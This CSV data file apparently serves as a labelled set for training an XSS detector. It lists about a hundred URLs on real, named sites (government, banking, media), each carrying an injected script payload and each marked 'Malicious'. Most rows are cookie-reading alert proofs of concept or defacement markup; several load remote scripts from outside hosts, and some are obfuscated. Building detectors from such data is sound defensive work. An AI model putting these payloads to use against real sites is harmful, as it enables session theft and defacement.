Payloads,Class
http://textbooknova.com/?q=%22/%3e%3cscript%3ealert%28document.cookie%29%3c%2fscript%3e,Malicious
http://astrogravs.nasa.gov/%7d%22%3e%3cscript%3ealert(%22test%22)%3c/script%3e,Malicious
http://www.buy.com/buytv/default.asp?segment=&quot;&gt;&lt;/script&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;mar<br>quee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narc<br>oticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/mar<br>quee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;<br>h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs<br>&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+<br>narcoticxs&lt;/h1&gt;&lt;/marquee&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.latindex.unam.mx/titulo.php?opcion=1&amp;letra=&lt;/textarea&gt;'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;,Malicious
http://israel.solidcamsupport.net/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.co<br>m/chat/c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(docu<br>ment.cookie);&lt;/script&gt;&lt;script&gt;alert(/kabus/);&lt;/script&gt;,Malicious
http://constitution.president.gov.tw/en/search_list.php?keyword=%22%3e%3cscript%20src=http://droptix<br>.viralcoders.com/xss.js%3e,Malicious
"http://www.sehitlerolmez.net/haber_kategori.php?k=5%22%3e%3cscript%3ealert(%22asker+vurulunca+degil,<br>+unutulunca+olur%22)%3c/script%3e",Malicious
http://www.scena.org/links/link.asp?flag=3&amp;lan=1&amp;title=%22%3e%3cbody+onload=alert(%22by%20encore%22)<br>%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2%3e,Malicious
http://www.cctvtime.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%3c/s<br>cript%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://search.wn.com/?action=search&amp;search_string=%3cscript+type%3d%22text%2fjavascript%22+src%3d%22<br>http%3a%2f%2fhardy.wn.com%2fula%2fcheetah%2fjs%2fvermenu_switch.js%22%3ehacked%3c%2fscript%3e%3cscri<br>pt%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;language_id=1&amp;sort_type=nwf&amp;corpus=current&amp;search_<br>type=head_all,Malicious
"http://www.streetinsider.com/stock_lookup.php?q=%3cscript%3ealert(string.fromcharcode(115,101,121,10<br>9,101,110))%3c/script%3e",Malicious
http://ga1.org/ntu_action/join.tcl?qp_source=%22%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://www.verizonwirelessarena.com/email.asp?url=%22%3e%3cscript%3ealert('by%20encore')%3c/script%3<br>e,Malicious
http://ecom.tig.com/standardwebstore/forgottenpassword2.asp?redirect=%22%22%3e%3cscript%3ealert(%27x<br>ss%27)%3c/script%3e,Malicious
http://www.rarlabs.com/gp_continent.php?continent=%22%3e/r0hit/%3e%3cscript%3ealert(document.cookie)<br>%3c/script%3e%3cscript%20src=http://infysec.net/x.js%3e%3c/script%3e,Malicious
http://www.registrocivil.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.baltijostransportas.com/index2.php?lang=%22%3cscript%3ealert(document.cookie);%3c/script%<br>3e,Malicious
"http://www.saab.lv/main/global/en/tirdzn_lietoti1.shtml?id=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious
http://www.cyburbia.org/phpinfo.php?a[]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://example.ddo.jp/aas/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/scri<br>pt%3e,Malicious
http://www.calarkendinlet.turkcell.com.tr/user/index.screen?iscorp=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://jeux.ch.msn.com/?game=19%3cscript%3ealert%28%27airroxssed%27%29;%3c/script%3e,Malicious
http://loading.org/directory.php?cat=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://thehawks.org/hawks/bt/index.php?dir=.%2f%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.culturalink.gov.cn/gb/php.php?cx[][][][][][][][][][][][][][][][][][][][][][][][][][][][][<br>][][][][][][][][]=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3c/script%3e,Malicious
http://apac.sec.samsung.com/id/galaxymini/index.php/video_gallery/search/?fullname=%22%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&sort=created_date,Malicious
http://www.flipdog.com/results.php?k=%3ch1%3e%3cfont%20color=red%3et3h%201nt3rn3t%20m4f14%20wuz%20h3<br>r3!%3c/font%3e%3cfont%20color=blue%3e%3cmarquee%3e%3cplaintext%3e,Malicious
http://dweb.repubblica.it/dettaglio/lautunno-del-benessere/25687?type=//xados--%3e%22%3e%3cscript%3e<br>alert%28document.cookie%29%3c/script%3e%3ciframe%20src=%22http://www.xssed.com%22%3e%3c/iframe%3e,Malicious
"http://pytanie.o2.pl/index.php?dzial=faq&amp;nr_site=2&amp;nr_kat=1&amp;nam_kat=wymagania%3cscript%3ealert(docum<br>ent.cookie);%3c/script%3e%20techniczne,%20jak%20zacz%b1%e6%20i%20problemy%20z%20logowaniem",Malicious
http://l14mn.chip.jp/menu.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;<br>cn=0&amp;cnn=,Malicious
http://en.softonic.com/s/%22%3e%3cmarquee%3edefaced%20by%20sponsfull%20for%20xssed.com%3c%2fmarquee%<br>3e,Malicious
http://www.talent1.mediaset.it/servizi/registrationcheck.jsp?portal=mediaset&amp;srvc=34&amp;name=%22%3e%3cs<br>cript%3ealert(document.cookie);%3c/script%3e%3cscript%20src=%22http://www.googlebig.com/l.js%22%3e,Malicious
http://kobesearch.cpan.org/htdocs/app-cmd/app/cmd/simple.html%27%22%3e%3c/title%3e%3cscript%3ealert(<br>1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.stonyfield.com/search/index.jsp?q=junk+mail'%22%3e%3c/iframe%3e%3cscript%3ealert('xss%20b<br>y%20applejax');%3c/script%3e&amp;x=0&amp;y=0,Malicious
http://www.videojob.co.il/mp3/users_list.php?s_maincat=7&amp;page=%22%3e%3cscript%3ealert(document.cooki<br>e)%3c/script%3e%3e%3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e,Malicious
http://mediacenter.gazzetta.it/mediacenter/action/player?uuid=%22%3e%3cscript%3ealert%28%2fxss+by+re<br>dtuning%2f%29%3b%3c%2fscript%3e&amp;filtro=tutti&amp;menu=main3&amp;navname=2,Malicious
http://www.sit.ac.nz/sphider/search.php?query=&amp;type='&amp;results=&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&amp;search=,Malicious
http://www.50statesclassifieds.com/classifieds/showcategory.php?type=6&amp;keyword=&quot;&gt;&lt;script&gt;alert(backd<br>oor)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://gow.epsrc.ac.uk/listgrants.aspx?mode=latest}&lt;/style&gt;&lt;script&gt;a=eval;b=alert;a(b(/xss/.source))<br>;&lt;/script&gt;,Malicious
http://www.transparencia.gov.br/portalcomprasdiretasedorgao.asp?ano=2007&amp;valor=39896699228644&amp;codigo<br>gd=2&amp;nomegd=amortiza%e7%e3o%20e%20juros%20da%20d%edvida&amp;codigoed=74&amp;nomeed=got&amp;valored=32370103346&amp;c<br>odigoos=25000&amp;nomeos=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;valoros=32370103346,Malicious
http://vietvodao.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/<br>h1&gt;&lt;/marquee&gt;,Malicious
http://www.dateyourbloodtype.com/member/profile_blogs_page.php?blog_profile_id=&quot;&gt;&lt;script&gt;alert(&quot;back<br>door&quot;)&lt;/script&gt;,Malicious
http://www.minfin.gov.by/search/?action=index&amp;text=%22%3e'%3e%3cscript%3ealert(123)%3c/script%3e%22',Malicious
http://marketplace.intuit.com/search.asp?category=201&amp;categoryname=')%3e%3c/script%3e%3cscript%3eale<br>rt(document.cookie)%3c/script%3e,Malicious
http://3deg.net/~orz2ch/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kus<br>omiso.com%22)%3c/script%3e,Malicious
http://www.nsf.org/consumer/drinking_water/contaminant_4-d.asp?program=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/sc<br>ript&gt;,Malicious
http://www.buenosaires.gob.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
https://www.kill.net:19638/webhost/services/virtualhosting/useradmin/?ocw_login_username=&quot;&gt;&lt;script&gt;a<br>lert(document.domain)&lt;/script&gt;,Malicious
http://www.miniatuurbussen.nl/main.php?title=&lt;script&gt;alert(1);&lt;/script&gt;&amp;url=http://google.com?&quot;&gt;&lt;/if<br>rame&gt;&lt;script&gt;alert(1);&lt;/script&gt;&lt;!--,Malicious
http://www.bulacan.gov.ph/tourism/touristspotpostfeedback.php?id=&quot;&gt;&lt;script&gt;alert(/ar3sw0rmed/);&lt;/scr<br>ipt&gt;,Malicious
http://ferl.qia.org.uk/unavailable.cfm?reason=12&amp;requestedurl=ferl.qia.org.uk/display.cfm?catid=%22%<br>3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,Malicious
http://sante.canoe.com/browse_alphabetically.asp?search_letter=%22%3e%3cscript%3ealert(%22by%20encor<br>e%20!%22)%3c/script%3e,Malicious
http://www.azbuz.com/loginform2.jsp?returnurl=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%<br>3ch1%3eby%20st@rext%3c/h1%3e,Malicious
http://www.music.wisc.edu/facilities?facility_id=4%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/sc<br>ript%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.portviewconstruction.co.uk/replica/philboard/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert(do<br>cument.cookie)&lt;/script&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious
http://www.designtaxi.com/subscribe.jsp?email_user='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss<br>.html%20%3c,Malicious
http://www.orlando-miamilistings.com/?pg=asdf%3cscript%3ealert(1337)%3c/script%3e&amp;frame=1,Malicious
http://ipko.net/ipko_portal/site/bin/comments_arte.php?newsid=1%22%3e%3cscript%3ealert%281%29%3c/scr<br>ipt%3e%3c!--,Malicious
http://www.lytcsw.com/caigou.asp?id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdoor&lt;<br>/h1&gt;&lt;/marquee&gt;,Malicious
http://www.tcnjathletics.com/news/gen/2004/7/27/04lindy's.asp?path=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script<br>&gt;,Malicious
http://www.jerusalemsummit.org/eng/news.php?news=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;<br>&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://blog.jfoto.org/index.php?setdate=200511&amp;setday=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%<br>72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%3<br>1%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36<br>%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;phpsessid=2ecea9c089bdb6449f8d<br>d14b6fd0ac43,Malicious
http://www.inuit.org/index.asp?lang='%22%3e%3ch1%3erubberduck%3c/h1%3e%3cbr%3e%3cbr%3e%3cmarquee%3ew<br>hitehat%20forever%3c/marquee%3e&amp;num=244,Malicious
http://www.tntexpress.com.au/interaction/remote/account_remote.asp?c=jsrs1&amp;f=ge%3cscript%3ealert%281<br>%29;%3c/script%3e%3cinput%3etaccount&amp;p0=[123123123]&amp;u=1300713738368%22%3cinput%3e,Malicious
http://www.apollo.lv/portal/search/?submit=1&amp;national=yes&amp;search_where=www&amp;where=1&amp;keyword=%3cscript<br>%3ealert(123)%3c/script%3e&amp;query=%3cscript%3ealert(123)%3c%2fscript%3e,Malicious
http://www.nochild.org/child-list.php?loc=kenya&amp;p=2%3ciframe%20src=%22http://xssed.com%22%3e,Malicious
"http://www.ngz-server.de/testserver/testserver.php?games=';alert(string.fromcharcode(88,83,83))//\';<br>alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fr<br>omcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%<br>3c/script%3e",Malicious
http://www3.vis.ne.jp/~asaki/p_diary/diary.cgi?year=2007&amp;month=09&amp;day=11'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
"http://www.saab.com.au/servlet/saabmail?attch1=111-222-1933email@address.tst&template=>""><script%20%0a%0d>alert(/xss%20by%20turkpower/)%3b</script><h1>xss%20by%20turkpower</h1></marquee>",Malicious
http://www.wirelessanarchy.com/process.rvt?cat1='%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script<br>%3ecommunity%20groups&amp;cat2=asia&amp;cat3=china&amp;cat4=all&amp;edit=0000,Malicious
"http://pbma.hq.nasa.gov/index.php?fuseaction=pbma.faqpro&amp;action=';alert(string.fromcharcode(88,83,83<br>))//\';alert(string.fromcharcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(st<br>ring.fromcharcode(88,83,83))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,8<br>3,83))%3c/script%3e",Malicious
https://sourceforge.net/services/buy/service_providers.php?words=%22%3e%27%3e%3cscript%3ealert%28123<br>%29%3c%2fscript%3e%22%27,Malicious
http://fw36.members.freewebs.com/directory/viewsites.jsp?query=&quot;);&lt;/script&gt;&lt;script&gt;alert(123)&lt;/scrip<br>t&gt;,Malicious
http://www.nissan.hr/hrv/page.asp?v=%22%3e%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e%3cst<br>y%20%20le%3ebody{visibility:hidden;}%20html{background-color:%20black;}%3c/style%3e'%22%3e%3cdiv%20s<br>tyle=%2%20%202position:%20absolute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%2010;visibil<br>ity:%20visibl%20%20e;%20color:%20white;%20font-size:%2040px;%22%3e%3cimg%20src=%22http://i28.tinypic<br>.com/1j402t.jpg%22%%20%2020style=%22height:%20400px;%20width:%20400px;%22%20alt=%22by%20sony%22%3e%3<br>cbr%3einsecurity%20romani%20%20a%3cbr%3eby%20sony%3ciframe%20src%20=http://www.youtube.com/watch?v=a<br>tziya14uv4%22%20width=%220%22%2%20%200height=%220%22%20%5c%3e%3c/div%3e,Malicious
http://www.movies-links.cc/live/live_tv.php?mid=-26%22%3e%3cscript%3ealert%28document.cookie%29%3c/s<br>cript%3e,Malicious
http://ayurvedajusti.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;backdo<br>or&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://demo.doubleclick.com/generators/gen_302asp.asp?jumpto=&lt;/textarea&gt;&lt;script&gt;alert(/xss/)&lt;/script<br>&gt;,Malicious
http://www.outlets.ca/cgi-bin/tseekdir.cgi?location==%3cscript%3ealert(%22xss%20by%20\nxylitol%22)%3<br>c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://www.hometrotters.com/ferieboligerdanmark.asp?region=14&amp;city=%22%3e%3cbody+onload=alert(%22by%<br>20encore%22)%3e%3cmarquee%3e%3ch1%3eunutamadim%20:(%20%20%20%3c/h1%3e%3ch2%3e%20by%20encore%20%3c/h2<br>%3e,Malicious
http://searchalaska.adn.com/sp?keywords=%27%22%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e&amp;<br>submit=find+%bb&amp;aff=1100,Malicious
http://www.ssp.df.gov.br/003/00316003.asp?ttbuscar116912=&amp;slcd_origem=&amp;ttbuscar=%27%3balert%28string<br>.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5c%27%3balert%<br>28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%22%3ba<br>lert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%2f%2f%5<br>c%22%3balert%28string.fromcharcode%2883%2c69%2c67%2c85%2c82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29<br>%2f%2f--%3e%3c%2fscript%3e%22%3e%27%3e%3cscript%3ealert%28string.fromcharcode%2883%2c69%2c67%2c85%2c<br>82%2c73%2c84%2c89%2c32%2c83%2c85%2c88%29%29%3c%2fscript%3e&amp;btbuscar=pesquisar&amp;rdcampopesquisado=1,Malicious
"http://www.charities.ago.state.ma.us/charities/index.asp?charities_app_ctx=error&amp;charities_sub_ctx=e<br>ntry&amp;error_flag=&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;iiframe src=http://www.xssed.com&lt;/iframe&gt; <br>&lt;- sorry for resubmit, i messed up the last ones code..this is the official atty general of<br>massachussets site. xss poc status-&gt;contacted",Malicious
http://www.vattenfall.de/de/subscriptionform.xml?current-page=%2fde%2fpresse-aboservice.htm&amp;sendpage<br>url=presse-aboservice.htm&amp;subscriptionlist=3981c1acfe604763966a661c88fa1922.xml&amp;subscriptiontimestam<br>p=20%3a35%3a13%3a59&amp;action=subscribe&amp;subscribeheadline=anmeldung&amp;unsubscribeheadline=abmeldung&amp;first<br>_name_input=mandatory&amp;first_name=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%3e&amp;surn<br>ame_input=mandatory&amp;surname=&amp;telephone_input=visible&amp;telephone=&amp;fax_input=visible&amp;fax=&amp;company_input<br>=visible&amp;company=&amp;street_input=visible&amp;street=&amp;house_nr_input=visible&amp;house_nr=&amp;zip_code_input=visib<br>le&amp;zip_code=&amp;city_input=visible&amp;city=&amp;email_input=mandatory&amp;email=&amp;stf_categorylist=bergbau|+energie<br>politik|+gesellschaft%2fsport%2fkultur|+innovation+%26+umwelt|+netz%2fhandel%2fit&amp;categories_nr=1%3b<br>2%3b3%3b4%3b5&amp;subscription_link_text=schalten+sie+nun+ihr+abonnement+frei!&amp;unsubscription_link_text=<br>beenden+sie+jetzt+ihr+abonnement!&amp;leading_message_text=sie+haben+sich+f%c3%bcr+das+abonnement+von+ab<br>oservice+mit+folgenden+daten+registriert%3a&amp;trailing_message_text_subscription=zum+abbestellen+gen%c<br>3%bcgt+es%2c+ihre+e-mail-adresse+in+das+formular+unserer+internet-abo-seite+einzugeben+und+auf+%22ab<br>bestellen%22+zu+klicken.+ihre+daten+%c3%a4ndern+sie%2c+indem+sie+dort+ebenfalls+ihre+e-mail-adresse+<br>plus+die+neuen+daten+angeben.%3cbr%3e%3cbr%3ebeachten+sie+auch+unsere+hinweise+zum+datenschutz.&amp;trai<br>ling_message_text_unsubscription=ihre+daten+%c3%a4ndern+sie%2c+indem+sie+dort+ebenfalls+ihre+e-mail-<br>adresse+plus+die+neuen+daten+angeben.+%3cbr%3e%3cbr%3ebeachten+sie+auch+unsere+hinweise+zum+datensch<br>utz.&amp;absenden.x=64&amp;absenden.y=13&amp;absenden=submit,Malicious
http://de.888.com/new888/home.htm?page=gettingstarted&amp;lang=%22%3e%3cscript%3ealert(document.cookie)%<br>3c/script%3e,Malicious
http://rebels.romkids.org/cgi-bin/main2010/rknewz.pl?function=visitbanner&amp;id=rkb00000074&amp;vurl=http:/<br>/www.'&quot;&gt;&lt;script&gt;alert(1337)&lt;/script&gt;,Malicious
http://tajonline.tolshop.com/v1/indian/catalogue.php?global_search=n&amp;keyword=%22%3e%3cscript%3ealert<br>(%27cueballr%27)%3c/script%3e,Malicious
http://www.metroflog.com/search.php?cx=partner-pub-7814731125428179%3a2tu1mep6cd2&cof=forid%3a10&ie=iso-8859-1&q=%22%2b{valueof%3alocation%2c+tostring%3a+[].join%2c0%3a%27jav\x61script%3aalert+\x280%29%27%2clength%3a1}%2f%2f+%3cscript%3ealert%28%22pwned%22%29%3c%2fscript%3e+%3cscript%3ealert%28%22by%22%29%3c%2fscript%3e+%3cscript%3ealert%28%22sh3n%22%29%3c%2fscript%3e+%3cscript%3efunction+do_main%28%29{+%09document.body.innerhtml+%3d+%22%3ch1%3exshacked+by+sh3n%22%3b+}++do_main%28%29%3b+%3c%2fscript%3e+%2f%2f&sa=buscar,Malicious
http://www.stmaryro.org/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h<br>1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.immobiliarediamante.com/ricerca-immobile.php?sezione=%22%3e%3cscript%3ealert%28document.c<br>ookie%29;%3c/script%3e%3c%22&amp;tipo_imm=0&amp;prezzo_min=0&amp;x=77&amp;y=6,Malicious
http://www.jihf.or.jp/link/yomi.php?mode=dir&amp;path=/'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%<br>3e%3c/script%3e,Malicious
https://bankingportal.sparkasse-wuppertal.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.<br>de%3e,Malicious
http://www.phazeddl.com/search.php?q=%3ch1%3e%3ccenter%3ehacking-gurus%3c/center%3e%3cbr%3e%3cmarque<br>e%3edont-mess-with-us%3c/marquee%3e%3c/h1%3e,Malicious
http://www.rtl.lu/search/rtlsearch/?q=%3cscript%3ealert%28%27xylitol+is+back+-+greetz+to+xssed.com+%<br>21%27%29%3c%2fscript%3e,Malicious
http://whoislike.it/index.php?mod=domain&amp;userinput=design.yahoo.com/index.php}%3c/style%3e%3cscript%<br>3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c<br>/h1%3e%3c/marquee%3e}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e%27%22%3<br>e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious
http://gaziantepspor.org.tr/medya.asp?kategori=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.ga.com/news.php?page=3%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://hackerslist.info/index.php?search='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/scri<br>pt%3e,Malicious
http://icwales.icnetwork.co.uk/search.cfm?what=%3cscript%3ealert(/xss%20-%20thedefaced.org/)%3c/scri<br>pt%3e%3cp,Malicious
http://start.toshiba.com/games/free_online_games.php?cat=%22%3e%3c/title%3e%3cscript%3ealert%28%22xs<br>s%20%22%29%3c/script%3e%3cscript%3ealert%28%22meow%22%29%3c/script%3e%3cscript%3ealert%28%22meow%20b<br>y%20sony%22%29%3c/script%3e%3cstyle%3ebody{visibility:hidden;}%20html{background-image:%20url%28http<br>://www.lenagold.ru/fon/peo/part/body09.jpg%29;}%3c/style%3e%27%22%3e%3cdiv%20style=%22position:%20ab<br>solute;left:%20420px;top:%2040px;%e2%80%8b%e2%80%8bz-index:%2010;visibility:%20visible;%20color:%20w<br>hite;%20font-size:%2040px;%22%3e%3cimg%20src=%22http://i1.giftube.ru/multjashki/kot_vygljadyvaet_927<br>ccf5f2ff24217ac6dd26dceed075a.gif%22%20style=%22height:%20400px;%20width:%20500px;%22%3e,Malicious
http://www.kerb-altenbuch.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;b<br>ackdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious
http://www.flodeo.com/search2.php?param=%3e%22%3e%3cscript%3ealert%28%27norehem+was+here%21%21%27%29<br>%3c%2fscript%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem+was+here%3c%2fmarquee%3e%3c%2fh1%3e%3c%2<br>fh1%3e%3c%2fh1%3e%3ccenter%3e%3cimg+src%3d%22http%3a%2f%2fwww.cibernautica.com%2fforocibernautica%2f<br>upload%2fnorehemzu4.gif%22%3e%3c%2fcenter%3e%3ciframe+src%3dhttp%3a%2f%2fjersain.iespana.es%2fxss.ht<br>ml+%3c&amp;search=1&amp;btn=buscar,Malicious
http://www.nbg.gov.ge/index.php?kw=http%3a%2f%2fwww.nbg.gov.ge%2findex.php%3fkw%3d%22%3e%3cscript%3e<br>alert%28%22fugitif%22%29%3c%2fscript%3e&amp;x=21&amp;y=9&amp;m=5,Malicious
https://cissecure.nci.nih.gov/ncipubs/searchresults.asp?subject2=nutrition%22%3e'%3e%3cscript%3ealer<br>t('xss')%3c/script%3e,Malicious
